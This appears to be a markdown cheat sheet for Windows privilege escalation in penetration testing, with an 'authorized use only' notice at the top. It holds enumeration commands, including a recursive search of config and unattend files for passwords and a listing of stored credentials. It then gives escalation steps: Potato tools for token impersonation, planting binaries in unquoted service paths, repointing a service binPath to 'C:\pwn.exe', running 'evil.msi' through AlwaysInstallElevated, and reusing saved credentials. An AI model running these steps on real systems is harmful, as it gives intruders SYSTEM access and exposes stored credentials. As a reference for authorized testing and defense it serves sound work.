# Windows privilege escalation

> Authorized use only. Automated: winPEAS, PowerUp.ps1, Seatbelt.
> Enumerate, confirm, then escalate.

## Enumerate

```cmd
whoami /priv                :: token privileges (the fast path)
whoami /all                 :: groups + privileges
systeminfo                  :: OS build, hotfixes (for exploit-suggester)
wmic qfe get HotFixID       :: installed patches
```

```powershell
# stored creds / interesting files
cmdkey /list
Get-ChildItem -Recurse -Include *.config,*.xml,unattend.xml -EA 0 | Select-String -Pattern 'password'
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
```

## Common wins

| Vector | Check | Escalate |
|--------|-------|----------|
| **Token privileges** | `whoami /priv` shows `SeImpersonatePrivilege` | Potato (Juicy/Print/Rogue) → SYSTEM |
| Unquoted service path | `wmic service get name,pathname` has spaces, no quotes | drop a binary in the writable gap |
| Weak service perms | `sc qc <svc>` / `accesschk` writable | reconfigure binPath to your payload, restart |
| AlwaysInstallElevated | both HKLM+HKCU reg keys = 1 | `msiexec /i evil.msi` runs as SYSTEM |
| Autorun / scheduled task | task runs as SYSTEM, script writable | edit the target script |
| Saved credentials | `cmdkey /list` | `runas /savecred /user:admin cmd` |

## Token → SYSTEM (SeImpersonate)

```cmd
:: with SeImpersonate/SeAssignPrimaryToken (IIS/MSSQL service accounts)
GodPotato -cmd "cmd /c whoami"
:: or PrintSpoofer / JuicyPotatoNG depending on Windows version
```

## Service abuse

```cmd
sc qc <service>                          :: inspect config
sc config <service> binPath= "C:\pwn.exe"
net stop <service> & net start <service>
```

Confirm the Windows build against an exploit-suggester before reaching for kernel CVEs.
